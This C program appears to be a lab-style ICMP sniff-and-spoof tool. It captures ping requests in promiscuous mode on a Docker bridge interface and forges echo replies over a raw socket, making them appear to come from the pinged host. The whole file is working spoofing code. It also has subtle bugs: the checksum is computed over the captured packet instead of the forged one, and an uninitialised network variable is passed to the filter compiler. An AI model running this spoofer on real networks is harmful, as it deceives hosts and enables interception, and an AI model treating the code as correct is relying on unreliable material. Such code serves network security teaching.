#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <arpa/inet.h>

#include <netinet/tcp.h>
#include <stdlib.h>
#include <unistd.h>
#include <net/ethernet.h>
// #include <netinet/ip_icmp.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>


/* Ethernet addresses are 6 bytes */
// #define ETHER_ADDR_LEN 6


// Compute checksum (RFC 1071).

unsigned short in_cksum(unsigned short *paddress, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = paddress;
    unsigned short answer = 0;

    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1)
    {
        *((unsigned char *)&answer) = *((unsigned char *)w);
        sum += answer;
    }

    // add back carry outs from top 16 bits to low 16 bits
    sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
    sum += (sum >> 16);                 // add carry
    answer = ~sum;                      // truncate to 16 bits

    return answer;
}

/* Ethernet header */
struct ethheader
{
    u_char ether_dhost[ETHER_ADDR_LEN]; /* destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* source host address */
    u_short ether_type;                 /* IP? ARP? RARP? etc */
};

/* ICMP Header  */
struct icmpheader {
  unsigned char icmp_type; // ICMP message type
  unsigned char icmp_code; // Error code
  unsigned short int icmp_chksum; //Checksum for ICMP Header and data
  unsigned short int icmp_id;     //Used for identifying request
  unsigned short int icmp_seq;    //Sequence number
};


struct ipheader {
    unsigned int ip_hl:4;          /* header length */
    unsigned int iph_v:4;           /* version */
    u_char ip_tos;                 /* type of service */
    u_short ip_len;                /* total length */
    u_short ip_id;                 /* identification */
    u_short ip_off;                /* fragment offset field */
#define IP_RF 0x8000              /* reserved fragment flag */
#define IP_DF 0x4000              /* don't fragment flag */
#define IP_MF 0x2000              /* more fragments flag */
#define IP_OFFMASK 0x1fff         /* mask for fragmenting bits */
    u_char ip_ttl;                 /* time to live */
    u_char ip_p;                   /* protocol */
    u_short ip_sum;                /* checksum */
    struct in_addr ip_src,ip_dst;  /* source and dest address */
};

void send_raw_ip_packet(struct ipheader* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->ip_dst;

    // Step 4: Send the packet out.
    sendto(sock, ip, ntohs(ip->ip_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}


void got_packet(u_char *args, const struct pcap_pkthdr *header,   const u_char *packet)
{
    
     struct ethheader *eth = (struct ethheader *)packet;
    struct ipheader *ip = (struct ipheader *)  (packet+sizeof(struct ethheader));
    struct icmpheader* icmp=(struct icmpheader*)(packet+sizeof(struct ethheader)+ip->ip_hl*4);

    if(icmp->icmp_type == 8){ //we want to send the pong when we have request
 
    printf("     GOT PACKET\n");
    printf("       Version: %d\n", (ip->iph_v));
    printf("       From: %s\n", inet_ntoa(ip->ip_src));
    printf("         To: %s\n", inet_ntoa(ip->ip_dst));
        
     char buffer[1500];
    memset(buffer, 0, 1500);
    memcpy(buffer, (packet + sizeof(struct ethhdr)), (header->len - sizeof(struct ethhdr)));

   /*********************************************************
      Step 1: Fill in the ICMP header.
    ********************************************************/
   struct icmpheader *icmp_attacker = (struct icmpheader *)(buffer +ip->ip_hl*4);//(struct icmpheader *) (buffer +14+ sizeof(struct ipheader));
   icmp_attacker->icmp_type = 0; //ICMP Type: 8 is request, 0 is reply.

   // Calculate the checksum for integrity
   icmp_attacker->icmp_code = icmp->icmp_code;

    icmp_attacker->icmp_chksum = 0;
   icmp_attacker->icmp_chksum = in_cksum((unsigned short *)icmp, 
                                 sizeof(struct icmpheader));

   /*********************************************************
      Step 2: Fill in the IP header.
    ********************************************************/
   struct ipheader *ip_attac = (struct ipheader *) buffer;
   ip_attac->iph_v = 4;
   ip_attac->ip_hl = 5;
   ip_attac->ip_ttl = 20;
   ip_attac->ip_src.s_addr = (ip->ip_dst.s_addr);//inet_addr("1.2.3.4");//(ip->ip_dst.s_addr);
   ip_attac->ip_dst.s_addr = (ip->ip_src.s_addr);
   ip_attac->ip_p = IPPROTO_ICMP; 
   ip_attac->ip_len = htons(sizeof(struct ipheader) + 
                       sizeof(struct icmpheader));

   /*********************************************************
      Step 3: Finally, send the spoofed packet
    ********************************************************/

    send_raw_ip_packet (ip_attac);
    }
  }


int main()
{

    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;

    char filter_exp[] = "icmp";// src 10.9.0.5";
    bpf_u_int32 net;

    /* Open the session in promiscuous mode
    Step 1: Open live pcap session on NIC with name lo*/
    handle = pcap_open_live("br-ffcc47c563e7", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", "br-ffcc47c563e7", errbuf);
        return (2);
    }

    /* Compile and apply the filter
      Step 2: Compile filter_exp into BPF psuedo-code */
    int comp = pcap_compile(handle, &fp, filter_exp, 0, net);
    if (comp == -1)
    {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return (2);
    }

    if (pcap_setfilter(handle, &fp) == -1)
    {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return (2);
    }

    // Step 3: Capture packets
    pcap_loop(handle, -1, got_packet, NULL);

    pcap_close(handle); // Close the handle
    return 0;
}
